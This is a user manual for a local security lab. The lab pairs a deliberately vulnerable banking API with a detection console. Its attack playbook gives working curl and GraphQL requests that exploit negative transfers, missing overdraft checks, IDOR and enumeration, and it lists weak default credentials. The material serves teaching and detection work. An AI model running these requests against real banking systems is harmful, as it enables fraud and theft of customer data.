# Loopback — User Manual

Full walkthrough for the Loopback lab: the **Apex Trust Bank** vulnerable target (REST + GraphQL, PostgreSQL) and the **Loopback SOC** standalone detection app. Everything runs on your machine — no real bank, no real customer data.

---

## 1. Starting the lab

### Docker (recommended)

```bash
cd loopback
docker compose up --build -d
docker compose ps          # all three services should be Up (db: healthy)
```

| What | Where |
| :--- | :--- |
| Banking portal | http://localhost:5000 |
| SOC console | http://localhost:5100 (operator `admin` / `admin`) |
| Bank GraphQL | http://localhost:5000/graphql (GraphiQL) |
| SOC GraphQL | http://localhost:5100/graphql |
| PostgreSQL (host) | localhost:5434 (`loopback` + `soc` databases) |

Stop / reset: `docker compose down` (add `-v` to wipe data).

### Local (bare Node)

Requires PostgreSQL on localhost:5432 (`postgres` / `12345678` by default — change via `.env`).

```bash
cd soc    && npm install && npm start
cd target && npm install && npm start
```

## 2. Banking portal walkthrough (http://localhost:5000)

1. **Sign in** with a demo customer (`Mary` / `peter`) or **Open Account** with your own username — new accounts open with a **500 ZWL deposit** and a sequential account number (`ACC-1005`, `ACC-1006`, …).
2. **Dashboard** — live balance, account number, recent activity.
3. **Send Money** — recipient account number, amount, memo. Quick-amount chips included. *Every transfer is one POST — intercept it later to exploit the business-logic flaws.*
4. **Transactions** — your ledger. The account-number box accepts *any* account (IDOR demo affordance).
5. **Statements** — downloads an official-style text statement (holder details + address + full ledger). The account-number box is also an IDOR demo affordance.
6. **Profile** — registered details + email update (the Client ID box is the IDOR demo affordance).
7. **API Keys** — your secret key; the Client ID box fetches *any* client's key.

## 3. SOC console walkthrough (http://localhost:5100)

Log in (`admin` / `admin`):

- **Live Traffic** — continuous REST + GraphQL stream; every API row is followed by the exact SQL statements it produced (paired by trace id). REST vs GraphQL chips, status codes, trace ids.
- **Security Alerts** — cards with severity chips (INFORMATIONAL → CRITICAL), type, actor, endpoint footprint. **Attack Path** opens the node chain *actor → endpoint → correlated SQL → target → impact* plus the step-by-step sequence; **Evidence** shows the raw JSON.
- **Sessions** — per-actor aggregates (last 60 min); click one for the **loopback timeline**: the session's requests in order with their SQL underneath.
- Header stats: API events, SQL events, alerts, high/critical, active actors. **Clear Store** resets the SOC store.

## 4. Attack playbook

Reproduce each scenario from the portal, with curl, or through Burp/ZAP. Run the SOC console next to it and watch alerts + attack paths appear.

### Scenario A — Negative transfer (business logic, balance inflation)

```bash
TOK=$(curl -s -X POST http://localhost:5000/api/auth/login -H 'Content-Type: application/json' \
  -d '{"username":"Mary","password":"peter"}' | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>console.log(JSON.parse(d).token))")

curl -s -X POST http://localhost:5000/api/transfers -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"toAccountNumber":"ACC-1002","amount":-150}'
```

The debit inverts into a credit: Mary's balance *increases*. The SOC raises **Business Logic Attack: Negative Amount Balance Inflation** (HIGH/CRITICAL).

### Scenario B — Overdraft bypass

```bash
curl -s -X POST http://localhost:5000/api/transfers -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"toAccountNumber":"ACC-1002","amount":50000}'
```

No insufficient-funds check → the transfer succeeds over the balance.

### Scenario C — Statement IDOR (exfiltrate another client's statement)

```bash
curl -s http://localhost:5000/api/statements/ACC-1002 -H "Authorization: Bearer $TOK" \
  | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{const s=JSON.parse(d).statement;console.log(s.accountHolder.name, '—', s.accountHolder.address)})"
```

Mary (ACC-1001) receives John's full statement. In Burp: intercept a legit statement download and swap the account number.

### Scenario D — API key IDOR + horizontal enumeration sweep

```bash
for id in 2 3 4 5; do
  curl -s -o /dev/null http://localhost:5000/api/users/$id/apikey -H "Authorization: Bearer $TOK"
done
```

≥3 distinct targets inside 60 s triggers **Resource Enumeration: Horizontal Sweep Detected**; each cross-user key access also raises progressive IDOR alerts (INFORMATIONAL → MEDIUM → HIGH).

### Scenario E — The same attacks over GraphQL

```bash
# BOLA: another user's secret key
curl -s -X POST http://localhost:5000/graphql -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' \
  -d '{"query":"query { user(id: 2) { id username email apiKey } }"}'

# IDOR: another client's statement
curl -s -X POST http://localhost:5000/graphql -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' \
  -d '{"query":"query { statement(accountNumber: \"ACC-1002\") { ownerName address balance } }"}'

# Business logic: negative transfer mutation
curl -s -X POST http://localhost:5000/graphql -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { transfer(toAccountNumber: \"ACC-1002\", amount: -75) { success message balance } }"}'
```

The SOC tags GraphQL events with their operation name and correlates them exactly like REST — one detection layer over both API surfaces.

### Scenario F — Watch it all in the SOC

Open http://localhost:5100 while running any scenario: Live Traffic pairs each request with its SQL; the alert's **Attack Path** shows the request → SQL → object → impact chain with the trace id that ties them together.

## 5. Reading an alert

- **Severity** — computed over the whole session window: repetition and cross-functional breadth escalate INFO → MEDIUM → HIGH → CRITICAL.
- **Attack Path** — 5 nodes (actor, endpoint, correlated SQL, target, impact) + 5 steps with the trace join as step 3.
- **Evidence** — raw event: trace id, request, resource owner, amount/balance metadata, the endpoints touched in the window, and the exact SQL.

## 6. Troubleshooting

| Symptom | Fix |
| :--- | :--- |
| `docker compose ps` shows db restarting | Port 5434 in use on the host → change the mapping in `docker-compose.yml` |
| Bank shows "db: down" | The db container isn't healthy yet — wait for `(healthy)`, or check `docker compose logs db` |
| SOC shows no traffic | Make requests on :5000 first; check the target container logs (`docker compose logs target`) for `streaming events` |
| Local mode can't connect | PostgreSQL not on 5432 — set `DATABASE_URL` / `SOC_DATABASE_URL` in `.env` |
| Want a clean slate | `docker compose down -v && docker compose up --build -d` |

## 7. Ethics

Everything here is synthetic and self-contained. Do not point these tools at systems you do not own or have written authorization to test.
